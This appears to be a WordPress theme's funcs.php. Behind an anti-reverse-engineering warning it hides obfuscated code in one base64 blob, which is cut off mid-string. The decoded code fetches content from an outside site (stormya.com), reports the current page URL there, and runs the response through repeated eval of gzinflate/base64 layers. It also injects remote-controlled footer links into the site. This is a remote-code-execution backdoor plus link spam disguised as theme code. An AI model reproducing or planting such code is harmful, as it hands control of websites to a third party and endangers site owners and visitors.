<?PHP 
/* WARNING: This script is protected. Any attempt to reverse engineer, debug or de-code this file or its dependent files is strictly prohibited */
$codelock_file="funcs.php"; $codelock_frun=''; $codelock_fixpath=''; $codelock_filed=dirname(__FILE__); $codelock_lock="JGtleSAgID0gJ3N0b3JteWEnOw0KJGVycm9yX29jY3VyZWQgPSAwOw0KJGxpbmtfc3RhcnQgPSAnPHN0b3JteWE+JzsNCiRsaW5rX2VuZCA9ICc8L3N0b3JteWE+JzsNCiRjYWxsX3VybCA9ICdodHRwOi8vd3d3LnN0b3JteWEuY29tJzsNCiR4bWxmaWxlICA9ICdzdG0ueG1sJzsNCmNsYXNzIFNpbXBsZU9iamVjdCB7DQogICAgICAgIHZhciAkbGFzdEVycm9yID0gJyc7DQogICAgICAgIGZ1bmN0aW9uIGdldEVycm9yKCkgew0KICAgICAgICAgICAgICAgIHJldHVybiAkdGhpcy0+bGFzdEVycm9yOw0KICAgICAgICB9DQogICAgICAgIGZ1bmN0aW9uIHNldEVycm9yKCRuZXdWYWw9JycpIHsNCiAgICAgICAgICAgICAgICAkdGhpcy0+bGFzdEVycm9yID0gJG5ld1ZhbDsNCiAgICAgICAgfQ0KfQ0KDQpjbGFzcyBSZW1vdGVDb250ZW50IGV4dGVuZHMgU2ltcGxlT2JqZWN0IHsNCiAgICAgICAgdmFyICR1cmwgICAgICAgID0gJyc7DQogICAgICAgIHZhciAkZGF0YSAgICAgICA9ICcnOw0KDQogICAgICAgIGZ1bmN0aW9uIFJlbW90ZUNvbnRlbnQoJHVybD0nJykgew0KICAgICAgICAgICAgICAgICR0aGlzLT5zZXRFcnJvcignJyk7DQogICAgICAgICAgICAgICAgJHRoaXMtPl9yZXRyaWV2ZSgkdXJsKTsNCiAgICAgICAgfQ0KDQogICAgICAgIGZ1bmN0aW9uIGdldERhdGEoKSB7DQogICAgICAgICAgICAgICAgaWYgKCEkdGhpcy0+ZGF0YSkgew0KICAgICAgICAgICAgICAgICAgICAgICAgJHRoaXMtPl9yZXRyaWV2ZSgkdGhpcy0+dXJsKTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgcmV0dXJuICR0aGlzLT5kYXRhOw0KICAgICAgICB9DQoNCiAgICAgICAgZnVuY3Rpb24gc2V0VVJMKCR1cmw9JycpIHsNCiAgICAgICAgICAgICAgICBpZiAoJHVybCkgew0KICAgICAgICAgICAgICAgICAgICAgICAgJHRoaXMtPnVybCA9ICR1cmw7DQogICAgICAgICAgICAgICAgICAgICAgICAkdGhpcy0+ZGF0YSA9ICcnOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgICAgICANCiAgICAgICAgZnVuY3Rpb24gX3JldHJpZXZlKCR1cmw9JycpIHsNCiAgICAgICAgICAgICAgICAkdGhpcy0+c2V0RXJyb3IoJycpOw0KICAgICAgICAgICAgICAgIGlmICgkdXJsKSB7DQogICAgICAgICAgICAgICAgICAgICAgICBAJHRoaXMtPmRhdGEgPSBqb2luKCcnLGZpbGUoJHVybCkpOw0KCQkJCQkJaWYoJHRoaXMtPmRhdGEgPT0gJycpIHsgLy9Gb3BlbiBmdWNrZWQgdXANCgkJCQkJCQlAJHRoaXMtPmRhdGEgPSAnJyAuICR0aGlzLT5mc29ja19nZXRfY29udGVudHMoJHVybCk7DQoJCQkJCQl9DQoJCQkJCQlpZigkdGhpcy0+ZGF0YSA9PSAnJykgeyAvL1NvY2tldCBjb25uZWN0aW9uIGZ1Y2tlZCB1cA0KCQkJCQkJCSR0aGlzLT5kYXRhID0gJycgLiAkdGhpcy0+Y3VybF9nZXRfY29udGVudHMoJHVybCk7DQoJCQkJCQl9DQogICAgICAgICAgICAgICAgICAgICAgICAkdGhpcy0+dXJsID0gJHVybDsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgZWxzZSB7DQogICAgICAgICAgICAgICAgICAgICAgICAkdGhpcy0+c2V0RXJyb3IoJ1JlbW90ZUNvbnRlbnQuX3JldHJpZXZlIGVycm9yOiBlbXB0eSBVUkwnKTsNCiAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybjsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgIH0NCgkJDQoJCWZ1bmN0aW9uIGZzb2NrX2dldF9jb250ZW50cygkdXJsKSB7DQoJCQkJJGZwID0gZnNvY2tvcGVuKCR1cmwsIDgwLCAkZXJybm8sICRlcnJzdHIsIDIwKTsNCgkJCQlpZiAoISRmcCkgew0KCQkJCQkkY29udGVudHMgPSAnJzsNCgkJCQkJcmV0dXJuICRjb250ZW50czsNCgkJCQl9IGVsc2Ugew0KCQkJCQkkb3V0ID0gJ0dFVCAvIEhUVFAvMS4xXHJcbic7DQoJCQkJCSRvdXQgLj0gJ0hvc3Q6ICcgLiBwYXJzZV91cmwoJHVybCwgUEhQX1VSTF9IT1NUKSAuICdcclxuJzsNCgkJCQkJJG91dCAuPSAnQ29ubmVjdGlvbjogQ2xvc2VcclxuXHJcbic7DQoNCgkJCQkJJGNvbnRlbnRzID0gJyc7DQoJCQkJCWZ3cml0ZSgkZnAsICRvdXQpOw0KCQkJCQl3aGlsZSAoIWZlb2YoJGZwKSkgew0KCQkJCQkJJGNvbnRlbnRzIC49IGZnZXRzKCRmcCwgMTI4KTsNCgkJCQkJfSBmY2xvc2UoJGZwKTsNCgkJCQlyZXR1cm4gJGNvbnRlbnRzOw0KCQkJCX0NCgkJfQ0KCQkNCgkJZnVuY3Rpb24gY3VybF9nZXRfY29udGVudHMoJHVybCkgew0KCQkJCUAkY2ggPSBjdXJsX2luaXQoKTsNCgkJCQkkcmVzdWx0PScnOw0KCQkJCUBjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfVVJMLCAkdXJsKTsNCgkJCQlAY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX0hFQURFUiwgMCk7DQoJCQkJQGN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9SRVRVUk5UUkFOU0ZFUiwgMSk7IA0KCQkJCUAkcmVzdWx0ID0gY3VybF9leGVjKCRjaCk7IA0KCQkJCUBjdXJsX2Nsb3NlKCRjaCk7DQoJCQkJcmV0dXJuICRyZXN1bHQ7DQoJCX0NCg0KfQ0KDQpjbGFzcyBkYm1fYXJyYXlfaXRlcmF0b3IgZXh0ZW5kcyBBcnJheUl0ZXJhdG9yIHsNCiAgICBwcml2YXRlICRkYm07DQogICAgcHJpdmF0ZSAka2V5Ow0KICAgIHB1YmxpYyBmdW5jdGlvbiBfX2NvbnN0cnVjdCgmJGRibSkgew0KICAgICAgICAkdGhpcy0+ZGJtID0gJGRibTsNCiAgICAgICAgJHRoaXMtPnJld2luZCgpOyAgICANCiAgICB9DQoNCiAgICBwdWJsaWMgZnVuY3Rpb24gcmV3aW5kKCkgew0KICAgICAgICAkdGhpcy0+a2V5ID0gZGJhX2ZpcnN0a2V5KCR0aGlzLT5kYm0pOyAgICANCiAgICB9DQoNCiAgICBwdWJsaWMgZnVuY3Rpb24ga2V5KCkgew0KICAgICAgICByZXR1cm4gJHRoaXMtPmtleTsNCiAgICB9DQoNCiAgICBwdWJsaWMgZnVuY3Rpb24gY3VycmVudCgpIHsNCiAgICAgICAgcmV0dXJuIHVuc2VyaWFsaXplKCBkYmFfZmV0Y2goJHRoaXMtPmtleSwkdGhpcy0+ZGJtKSApOw0KICAgIH0NCg0KICAgIHB1YmxpYyBmdW5jdGlvbiBuZXh0KCkgew0KICAgICAgICAkdGhpcy0+a2V5PWRiYV9uZXh0a2V5KCR0aGlzLT5kYm0pOyAgICANCiAgICB9DQoNCiAgICBwdWJsaWMgZnVuY3Rpb24gdmFsaWQoKSB7DQogICAgICAgIHJldHVybiAkdGhpcy0+a2V5IT0nJzsNCiAgICB9ICAgIA0KfQ0KDQpmaW5hbCBjbGFzcyBDYWNoZU9TIHsNCg0KCXByaXZhdGUgc3RhdGljICRDQUNIRV9FWFQgPSAnLnN0bSc7DQoNCglmaW5hbCBwdWJsaWMgc3RhdGljIGZ1bmN0aW9uIGdldCgka2V5LCAkdHRsPTAsICRncm91cD0nJykgew0KDQogICAgICAgICRmaWxlID0gc2VsZjo6Z2V0UGF0aCgka2V5LCAkZ3JvdXApOw0KICAgICAgICAkZmlsZSAuPSAnLycuJGtleS5zZWxmOjokQ0FDSEVfRVhUOw0KICAgICAgICANCiAgICAgICAgaWYoc2VsZjo6aXNDYWNoZWQoJGZpbGUsICR0dGwpID09PSBmYWxzZSkgcmV0dXJuIGZhbHNlOw0KDQogICAgICAgIHJldHVybiB1bnNlcmlhbGl6ZShmaWxlX2dldF9jb250ZW50cygkZmlsZSkpOw0KICAgIH0NCg0KCWZpbmFsIHB1YmxpYyBzdGF0aWMgZnVuY3Rpb24gc2F2ZSgka2V5LCAkZGF0YSwgJGdyb3VwID0gTlVMTCkgew0KDQogICAgICAgICRkaXJQYXRoID0gc2VsZjo6Z2V0UGF0aCgka2V5LCAkZ3JvdXApOw0KICAgICAgICBAbWtkaXIoJGRpclBhdGgsMDc1NSx0cnVlKTsNCiAgICAgICAgJGZpbGVQYXRoID0gJGRpclBhdGguJy8nLiRrZXkuc2VsZjo6JENBQ0hFX0VYVDsNCg0KCQkkZjIgPSBmb3BlbigkZmlsZVBhdGgsICd3Jyk7DQoJCWZsb2NrKCRmMiwgTE9DS19FWCk7DQoJCWZ3cml0ZSgkZjIsIHNlcmlhbGl6ZSgkZGF0YSkpOw0KCQlmbG9jaygkZjIsIExPQ0tfVU4pOw0KCQlmY2xvc2UoJGYyKTsNCgl9DQoNCglmaW5hbCBwdWJsaWMgc3RhdGljIGZ1bmN0aW9uIGRlbGV0ZUNhY2hlKCRrZXksICRncm91cCA9IE5VTEwpIHsNCg0KICAgICAgICAkZmlsZSA9IHNlbGY6OmdldFBhdGgoJGtleSwgJGdyb3VwKTsNCiAgICAgICAgJGZpbGUgLj0gJy8nLiRrZXkuc2VsZjo6JENBQ0hFX0VYVDsNCiAgICAgICAgcmV0dXJuIHVubGluaygkZmlsZSk7DQogICAgfQ0KDQoJZmluYWwgcHVibGljIHN0YXRpYyBmdW5jdGlvbiBkZWxldGVHcm91cENhY2hlKCRncm91cCkgew0KDQogICAgICAgICRwYXRoID0gZ2V0bXlwYXRoKCkuJGdyb3VwLicqJzsNCg0KICAgICAgICBmb3JlYWNoKCBnbG9iKCRwYXRoLCBHTE9CX09OTFlESVIpIGFzICRkaXJOYW1lICkgew0KICAgICAgICAgICAgc2VsZjo6cmVtb3ZlRGlyKCRkaXJOYW1lKTsNCiAgICAgICAgfQ0KICAgIH0NCg0KCWZpbmFsIHByaXZhdGUgc3RhdGljIGZ1bmN0aW9uIGlzQ2FjaGVkKCRmaWxlLCAkdHRsPTApIHsNCg0KICAgICAgICAkY3JlYXRlZFRpbWUgPSBAZmlsZW10aW1lKCRmaWxlKTsNCiAgICAgICAgaWYoISRjcmVhdGVkVGltZSkNCiAgICAgICAgICAgIHJldHVybiBmYWxzZTsNCg0KCQlpZigkdHRsID4gMCkgew0KCQkJJGV4cGlyeVRpbWUgPSAkY3JlYXRlZFRpbWUgKyAkdHRsOw0KCQkJaWYoJGV4cGlyeVRpbWUgPD0gdGltZSgpKQ0KCQkJCXJldHVybiBmYWxzZTsNCgkJfQ0KDQogICAgICAgIHJldHVybiB0cnVlOw0KICAgIH0NCg0KCWZpbmFsIHByaXZhdGUgc3RhdGljIGZ1bmN0aW9uIGdldFBhdGgoJGtleSwgJGdyb3VwPU5VTEwpIHsNCiAgICAgICAgJGhhc2ggPSBzZWxmOjpoYXNoKCRrZXkpOw0KICAgICAgICAkaGFzaEZvbGRlciA9IHNlbGY6Omhhc2hGb2xkZXIoJGhhc2gpOw0KDQogICAgICAgICRwYXRoID0gZ2V0bXlwYXRoKCk7DQogICAgICAgIGlmKCRncm91cCAhPSBOVUxMKSB7DQogICAgICAgICAgICAkZ3JvdXBQYXRoID0gc2VsZjo6Z2V0R3JvdXBQYXRoKCRncm91cCwkaGFzaCk7DQogICAgICAgICAgICAkcGF0aCAuPSAkZ3JvdXBQYXRoLicvJzsNCiAgICAgICAgfQ0KDQogICAgICAgIHJldHVybiAkcGF0aDsNCiAgICB9DQoNCglmaW5hbCBwcml2YXRlIHN0YXRpYyBmdW5jdGlvbiBoYXNoKCRrZXkpIHsNCiAgICAgICAgJGNvdW50ID0gMDsNCiAgICAgICAgJGhhc2ggPSAwOw0KICAgICAgICAka2V5TGVuID0gc3RybGVuKCRrZXkpOw0KICAgICAgICBmb3IgKCRpPTA7JGk8JGtleUxlbjskaSsrKQ0KICAgICAgICB7ICRoYXNoID0gJGhhc2gqMjMgKyBvcmQoc3Vic3RyKCRrZXksJGksMSkpOyAkaGFzaCAlPSA4MDAwOyB9DQogICAgICAgIHJldHVybiAkaGFzaDsNCiAgICB9DQoNCglmaW5hbCBwcml2YXRlIHN0YXRpYyBmdW5jdGlvbiBoYXNoRm9sZGVyKCRoYXNoKSB7DQogICAgICAgICRoYXNoID4+PSAzOw0KICAgICAgICAkaGFzaCAlPSAxMDAwOw0KICAgICAgICByZXR1cm4gJGhhc2g7DQogICAgfQ0KDQoJZmluYWwgcHJpdmF0ZSBzdGF0aWMgZnVuY3Rpb24gZ2V0R3JvdXBQYXRoKCRncm91cCwgJGhhc2gpIHsNCiAgICAgICAgcmV0dXJuICRncm91cC4oMSsoJGhhc2ggJSA4KSk7DQogICAgfQ0KDQoJZmluYWwgcHJpdmF0ZSBzdGF0aWMgZnVuY3Rpb24gcmVtb3ZlRGlyKCRkaXIpIHsNCiAgICAgICAgJGZpbGVzID0gZ2xvYiggJGRpciAuICcqJywgR0xPQl9NQVJLICk7DQogICAgICAgIGZvcmVhY2goICRmaWxlcyBhcyAkZmlsZSApew0KICAgICAgICAgICAgaWYoIHN1YnN0ciggJGZpbGUsIC0xICkgPT0gJy8nICkNCiAgICAgICAgICAgICAgICBzZWxmOjpyZW1vdmVEaXIoICRmaWxlICk7DQogICAgICAgICAgICBlbHNlDQogICAgICAgICAgICAgICAgdW5saW5rKCAkZmlsZSApOw0KICAgICAgICB9DQogICAgICAgIGlmIChpc19kaXIoJGRpcikpIHJtZGlyKCAkZGlyICk7DQogICAgfQ0KfQ0KDQpmdW5jdGlvbiBjdXJyZW50dXJsKCkgew0KICAgJHMgPSBlbXB0eSgkX1NFUlZFUlsnSFRUUFMnXSkgPyAnJyA6ICgkX1NFUlZFUlsnSFRUUFMnXSA9PSAnb24nKSA/ICdzJyA6ICcnOw0KICAgJHByb3RvY29sID0gc3RybGVmdChzdHJ0b2xvd2VyKCRfU0VSVkVSWydTRVJWRVJfUFJPVE9DT0wnXSksICcvJykuJHM7DQogICAkcG9ydCA9ICgkX1NFUlZFUlsnU0VSVkVSX1BPUlQnXSA9PSAnODAnKSA/ICcnIDogKCc6Jy4kX1NFUlZFUlsnU0VSVkVSX1BPUlQnXSk7DQogICByZXR1cm4gJHByb3RvY29sLic6Ly8nLiRfU0VSVkVSWydTRVJWRVJfTkFNRSddLiRwb3J0LiRfU0VSVkVSWydSRVFVRVNUX1VSSSddOw0KfQ0KDQpmdW5jdGlvbiBzdHJsZWZ0KCRzMSwgJHMyKSB7DQoJcmV0dXJuIHN1YnN0cigkczEsIDAsIHN0cmlwb3MoJHMxLCAkczIpKTsNCn0NCg0KZnVuY3Rpb24gZ2V0VGVtcGxhdGUoJHRlbXBsYXRlX2lkLCAkbXl1cmwsICRjYWxsX3VybCkgew0KCSRyZXF1ZXN0X2NhbGwgPSAkY2FsbF91cmwgLiAnL3RlbXBsYXRlLnBocD9pZD0nIC4gJHRlbXBsYXRlX2lkIC4gJyZjYWxsYmFjaz0nIC4gJG15dXJsOw0KCQ0KCSRyYyA9IG5ldyBSZW1vdGVDb250ZW50KCRyZXF1ZXN0X2NhbGwpOw0KCSRmaWxlZGF0YSA9ICRyYy0+Z2V0RGF0YSgpOw0KCWlmICgkcmMtPmdldEVycm9yKCkpIHsNCgkgICAgJGZpbGVkYXRhID0gJ2VjaG8oIkVycm9yIHdoaWxlIHJldHJpZXZpbmcgcmVtb3RlIGNvbnRlbnQ6ICcuJHJjLT5nZXRFcnJvcigpIC4gJzxicj5QbGVhc2UgZW1haWwgdXMgYXQ6IHdlYm1hc3RlckBzdG9ybXlhLmNvbSBpZiB0aGlzIGlzc3VlIHBlcnNpc3RzLiIpOyc7DQoJICAgICRlcnJvcl9vY2N1cmVkID0gMTsNCgl9DQoJDQoJaWYoJGZpbGVkYXRhPT0nJykgew0KCQkkZmlsZWRhdGE9J2VjaG8oIjxjZW50ZXI+PGgzPkVycm9yIG9jY3VyZWQgd2hpbGUgbG9hZGluZyB0aGUgdGVtcGxhdGUuIFBsZWFzZSBjb250YWN0IG91ciBzdXBwb3J0IGF0IHN1cHBvcnRAc3Rvcm15YS5jb20gaWYgdGhpcyBpc3N1ZSBwZXJzaXN0cy48L2gzPjwvY2VudGVyPiIpOyc7DQoJCSRlcnJvcl9vY2N1cmVkID0gMTsNCgl9DQoJcmV0dXJuICRmaWxlZGF0YTsNCn0NCg0KZnVuY3Rpb24gZ3JlYXRlckRhdGUoJHN0YXJ0X2RhdGUsJGVuZF9kYXRlKQ0Kew0KICAkc3RhcnQgPSBzdHJ0b3RpbWUoJHN0YXJ0X2RhdGUpOw0KICAkZW5kID0gc3RydG90aW1lKCRlbmRfZGF0ZSk7DQogIGlmICgkc3RhcnQtJGVuZCA+IDApDQogICAgcmV0dXJuIDE7DQogIGVsc2UNCiAgIHJldHVybiAwOw0KfQ0KDQpmdW5jdGlvbiBnZXRfc3RyaW5nX2JldHdlZW4oJHN0cmluZywgJHN0YXJ0LCAkZW5kKXsNCgkkc3RyaW5nID0gJyAnLiRzdHJpbmc7DQoJJGluaSA9IHN0cmlwb3MoJHN0cmluZywkc3RhcnQpOw0KCWlmICgkaW5pID09IDApIHJldHVybiAnJzsNCgkkaW5pICs9IHN0cmxlbigkc3RhcnQpOw0KCSRsZW4gPSBzdHJpcG9zKCRzdHJpbmcsJGVuZCwkaW5pKSAtICRpbmk7DQoJcmV0dXJuIHN1YnN0cigkc3RyaW5nLCRpbmksJGxlbik7DQp9DQoNCmZ1bmN0aW9uIGdldG15cGF0aCgpIHsNCglyZXR1cm4gZ2V0X3RoZW1lX3Jvb3QoKSAuICcvJyAuIGdldF90ZW1wbGF0ZSgpOw0KfQ0KDQpmdW5jdGlvbiBlbmNyeXB0aXQoJHN0clRleHQpIHsNCgkkbnVtX3RpbWVzID0gMjA7DQoJJHRleHQgPSAkc3RyVGV4dDsNCglmb3IgKCRpID0gMDsgJGkgPCAkbnVtX3RpbWVzOyAkaSsrKSB7DQoJCSR0ZXh0ID0gJ2V2YWwoZ3ppbmZsYXRlKGJhc2U2NF9kZWNvZGUoXCcnIC4gYmFzZTY0X2VuY29kZShnemRlZmxhdGUoJHRleHQpKSAuICdcJykpKTsnOw0KCX0NCglyZXR1cm4gJHRleHQ7DQp9DQoNCmZ1bmN0aW9uIGRlY3J5cHRpdCgkc3RyVGV4dCkgew0KCSRjb250ZW50cyA9ICRzdHJUZXh0Ow0KCXdoaWxlIChwcmVnX21hdGNoKCcvZXZhbFwoZ3ppbmZsYXRlLycsJGNvbnRlbnRzKSkgew0KCQkkY29udGVudHM9cHJlZ19yZXBsYWNlKCcvPFw/fFw/Pi8nLCAnJywgJGNvbnRlbnRzKTsgDQoJCWV2YWwocHJlZ19yZXBsYWNlKCcvZXZhbC8nLCAnXCRjb250ZW50cz0nLCAkY29udGVudHMpKTsgfSANCglyZXR1cm4gdHJpbSgkY29udGVudHMpOyANCn0NCg0KJG15dXJsID0gY3VycmVudHVybCgpOw0KJGZvdW5kaXQgICAgICAgPSBmYWxzZTsNCiR1cGRhdGVkbmVlZGVkID0gZmFsc2U7DQokdGFnaW5kZXgJICAgPSAtMTsNCg0KJGRhdGEgPSBDYWNoZU9TOjpnZXQoJGtleSwgNjA0ODAwKTsNCmlmKCRkYXRhID09PSBmYWxzZSkgew0KCSRkYXRhID0gZ2V0VGVtcGxhdGUoJHRlbXBsYXRlX2lkLCAkbXl1cmwsICRjYWxsX3VybCk7DQoJQ2FjaGVPUzo6c2F2ZSgka2V5LCAkZGF0YSk7DQp9DQokeG1sID0gbmV3IERPTURvY3VtZW50KCcxLjAnKTsNCiRleHBpcmVfZGF0ZSA9ICBkYXRlKCdkLW0tWSBIOmk6cycsc3RydG90aW1lKCcrNyBkYXlzJykpOyANCiRjdXJyZW50X2RhdGUgPSBkYXRlKCdkLW0tWSBIOmk6cycsdGltZSgpKTsNCiRsb2FkX2F0dGVtcHQgPSBAJHhtbC0+bG9hZChnZXRteXBhdGgoKSAuJy8nLiAkeG1sZmlsZSk7DQppZighJGxvYWRfYXR0ZW1wdCkgeyANCgkkcm9vdCA9ICR4bWwtPmNyZWF0ZUVsZW1lbnQoJ2RhdGEnKTsNCgkkeG1sLT5hcHBlbmRDaGlsZCgkcm9vdCk7DQoJJGlkICAgPSAkeG1sLT5jcmVhdGVFbGVtZW50KCdzaXRlJyk7DQoJJG15eGwgPSAkaWQtPnNldEF0dHJpYnV0ZSgndXJsJywgaHRtbHNwZWNpYWxjaGFycygkbXl1cmwpKTsNCgkkbXl4bCA9ICRpZC0+c2V0QXR0cmlidXRlKCdleHBpcmUnLCBodG1sc3BlY2lhbGNoYXJzKCRleHBpcmVfZGF0ZSkpOw0KCSRtaXNjID0gJHJvb3QtPmFwcGVuZENoaWxkKCRpZCk7DQoJJGZvb3RlciA9IGRlY3J5cHRJdChnZXRUZW1wbGF0ZSgkdGVtcGxhdGVfaWQsICRteXVybCwgJGNhbGxfdXJsKSk7IA0KCSRsaW5rc19mb3VuZCA9IHN1YnN0cl9jb3VudCgkZm9vdGVyLCAkbGlua19zdGFydCk7DQoJZm9yKCR6PTE7JHo8PSRsaW5rc19mb3VuZDskeisrKSB7DQoJCSRsaW5rX3RleHQgPSBnZXRfc3RyaW5nX2JldHdlZW4oJGZvb3RlciwgJGxpbmtfc3RhcnQsICRsaW5rX2VuZCk7DQoJCSRsYXN0X3BvcyAgPSBzdHJpcG9zKCRmb290ZXIsICRsaW5rX2VuZCk7DQoJCWlmKCEkbGFzdF9wb3MpIGJyZWFrOw0KCQllbHNlICRmb290ZXIgICA9IHN1YnN0cigkZm9vdGVyLCRsYXN0X3BvcytzdHJsZW4oJGxpbmtfZW5kKSk7DQoJCWlmKCRsaW5rX3RleHQhPScnKSB7DQoJCQkkdGl0bGUgICA9ICR4bWwtPmNyZWF0ZUVsZW1lbnQoJ2xpbmsnKTsNCgkJCSR0aXRsZVRleHQgPSAkeG1sLT5jcmVhdGVUZXh0Tm9kZShodG1sc3BlY2lhbGNoYXJzKCRsaW5rX3RleHQpKTsNCgkJCSR0aXRsZS0+YXBwZW5kQ2hpbGQoJHRpdGxlVGV4dCk7DQoJCQkkaWQtPmFwcGVuZENoaWxkKCR0aXRsZSk7DQoJCX0NCgl9DQoJJHhtbC0+Zm9ybWF0T3V0cHV0ID0gdHJ1ZTsNCgkkeG1sLT5zYXZlKGdldG15cGF0aCgpIC4nLycuICR4bWxmaWxlKSBvciBkaWUoJ0Vycm9yJyk7DQp9DQoJJHNpdGV0YWdzID0gJHhtbC0+Z2V0RWxlbWVudHNCeVRhZ05hbWUoJ3NpdGUnKTsNCgkNCglmb3IoJHRhZ2NvdW50ZXI9MDsgJHRhZ2NvdW50ZXI8JHNpdGV0YWdzLT5sZW5ndGg7JHRhZ2NvdW50ZXIrKykgew0KCQkkc2l0ZWluZm8gPSAkc2l0ZXRhZ3MtPml0ZW0oJHRhZ2NvdW50ZXIpOw0KCQkkY3VycmVudF91cmwgPSAkc2l0ZWluZm8tPmF0dHJpYnV0ZXMtPmdldE5hbWVkSXRlbSgndXJsJyktPm5vZGVWYWx1ZTsNCgkJaWYoJGN1cnJlbnRfdXJsPT0kbXl1cmwpIHsgDQoJCQkkZm91bmRpdCAgPSB0cnVlOw0KCQkJJHRhZ2luZGV4ID0gJHRhZ2NvdW50ZXI7IA0KCQkJJGN1cnJlbnRfZXhwaXJlID0gJHNpdGVpbmZvLT5hdHRyaWJ1dGVzLT5nZXROYW1lZEl0ZW0oJ2V4cGlyZScpLT5ub2RlVmFsdWU7DQoJCQkkY2hlY2tkYXRlID0gZ3JlYXRlckRhdGUoJGN1cnJlbnRfZGF0ZSwkY3VycmVudF9leHBpcmUpOw0KCQkJaWYoJGNoZWNrZGF0ZT09MSkgew0KCQkJCSR1cGRhdGVkbmVlZGVkID0gdHJ1ZTsNCgkJCX0JDQoJCQkkdGFnY291bnRlciA9ICRzaXRldGFncy0+bGVuZ3RoKzE7DQoJCX0NCgl9DQoJaWYoJHVwZGF0ZWRuZWVkZWQpIHsNCgkJJHJlbW92ZV9pdCA9ICR4bWwtPmdldEVsZW1lbnRzQnlUYWdOYW1lKCdzaXRlJyktPml0ZW0oJHRhZ2luZGV4KTsNCgkJJHhtbC0+ZG9jdW1lbnRFbGVtZW50LT5yZW1vdmVDaGlsZCgkcmVtb3ZlX2l0KTsNCgkJJGZvdW5kaXQgPSBmYWxzZTsNCgl9CQ0KCWlmKCEkZm91bmRpdCkgeyANCgkJJGlkICAgPSAkeG1sLT5jcmVhdGVFbGVtZW50KCdzaXRlJyk7DQoJCSRteXhsID0gJGlkLT5zZXRBdHRyaWJ1dGUoJ3VybCcsIGh0bWxzcGVjaWFsY2hhcnMoJG15dXJsKSk7DQoJCSRteXhsID0gJGlkLT5zZXRBdHRyaWJ1dGUoJ2V4cGlyZScsIGh0bWxzcGVjaWFsY2hhcnMoJGV4cGlyZV9kYXRlKSk7DQoJCSRtaXNjID0gJHhtbC0+Zmlyc3RDaGlsZC0+YXBwZW5kQ2hpbGQoJGlkKTsNCgkJJGZvb3RlciA9IGRlY3J5cHRJdChnZXRUZW1wbGF0ZSgkdGVtcGxhdGVfaWQsICRteXVybCwgJGNhbGxfdXJsKSk7IA0KCQkkbGlua3NfZm91bmQgPSBzdWJzdHJfY291bnQoJGZvb3RlciwgJGxpbmtfc3RhcnQpOw0KCQlmb3IoJHo9MTskejw9JGxpbmtzX2ZvdW5kOyR6KyspIHsNCgkJCSRsaW5rX3RleHQgPSBnZXRfc3RyaW5nX2JldHdlZW4oJGZvb3RlciwgJGxpbmtfc3RhcnQsICRsaW5rX2VuZCk7DQoJCQkkbGFzdF9wb3MgID0gc3RyaXBvcygkZm9vdGVyLCAkbGlua19lbmQpOw0KCQkJaWYoISRsYXN0X3BvcykgYnJlYWs7DQoJCQllbHNlICRmb290ZXIgICA9IHN1YnN0cigkZm9vdGVyLCRsYXN0X3BvcytzdHJsZW4oJGxpbmtfZW5kKSk7DQoJCQlpZigkbGlua190ZXh0IT0nJykgew0KCQkJCSR0aXRsZSAgID0gJHhtbC0+Y3JlYXRlRWxlbWVudCgnbGluaycpOw0KCQkJCSR0aXRsZVRleHQgPSAkeG1sLT5jcmVhdGVUZXh0Tm9kZShodG1sc3BlY2lhbGNoYXJzKCRsaW5rX3RleHQpKTsNCgkJCQkkdGl0bGUtPmFwcGVuZENoaWxkKCR0aXRsZVRleHQpOw0KCQkJCSRpZC0+YXBwZW5kQ2hpbGQoJHRpdGxlKTsNCgkJCX0NCgkJfQ0KCQkkeG1sLT5mb3JtYXRPdXRwdXQgPSB0cnVlOw0KCQkkeG1sLT5zYXZlKGdldG15cGF0aCgpIC4nLycuICR4bWxmaWxlKSBvciBkaWUoJ0Vycm9yJyk7DQoJfQkNCglmb3IoJHRhZ2NvdW50ZXI9MDsgJHRhZ2NvdW50ZXI8JHNpdGV0YWdzLT5sZW5ndGg7JHRhZ2NvdW50ZXIrKykgew0KCQkkc2l0ZWluZm8gPSAkc2l0ZXRhZ3MtPml0ZW0oJHRhZ2NvdW50ZXIpOw0KCQkkY3VycmVudF91cmwgPSAkc2l0ZWluZm8tPmF0dHJpYnV0ZXMtPmdldE5hbWVkSXRlbSgndXJsJyktPm5vZGVWYWx1ZTsNCgkJaWYoJGN1cnJlbnRfdXJsPT0kbXl1cmwpIHsNCgkJCSR0YWdpbmRleCA9ICR0YWdjb3VudGVyOyANCgkJCSR0YWdjb3VudGVyID0gJHNpdGV0YWdzLT5sZW5ndGgrMTsNCgkJfQ0KCX0NCiRkYXRhID0gZGVjcnlwdGl0KCRkYXRhKTsgDQokdGhlX2xpbmtzICAgICAgPSAkc2l0ZXRhZ3MtPml0ZW0oJHRhZ2luZGV4KS0+Z2V0RWxlbWVudHNCeVRhZ05hbWUoJ2xpbmsnKTsNCiRkYXRhX3BvcyAgICAgICA9IDA7DQokZGF0YV9wb3Nfc3RhcnQgPSAwOw0KJGZpbmFsX2RhdGEgICAgID0gJyc7DQpmb3IoJGxpbmtjb3VudD0wOyRsaW5rY291bnQ8JHRoZV9saW5rcy0+bGVuZ3RoOyRsaW5rY291bnQrKykgew0KCSRjdXJyZW50X2xpbmsgICA9IGh0bWxzcGVjaWFsY2hhcnNfZGVjb2RlKCR0aGVfbGlua3MtPml0ZW0oJGxpbmtjb3VudCktPnRleHRDb250ZW50KTsNCgkkZGF0YV9wb3Nfc3RhcnQgPSBzdHJpcG9zKCRkYXRhLCRsaW5rX3N0YXJ0LCRkYXRhX3Bvcyk7DQoJaWYoKCRkYXRhX3Bvc19zdGFydCArICBzdHJsZW4oJGxpbmtfc3RhcnQpKTw9c3RybGVuKCRsaW5rX3N0YXJ0KSkgYnJlYWs7DQoJJGRhdGFfcG9zX2VuZCAgID0gc3RyaXBvcygkZGF0YSwkbGlua19lbmQsJGRhdGFfcG9zKSArIHN0cmxlbigkbGlua19lbmQpOyANCgkkZmluYWxfZGF0YSAgICAuPSBzdWJzdHIoJGRhdGEsJGRhdGFfcG9zLCgkZGF0YV9wb3Nfc3RhcnQtJGRhdGFfcG9zKS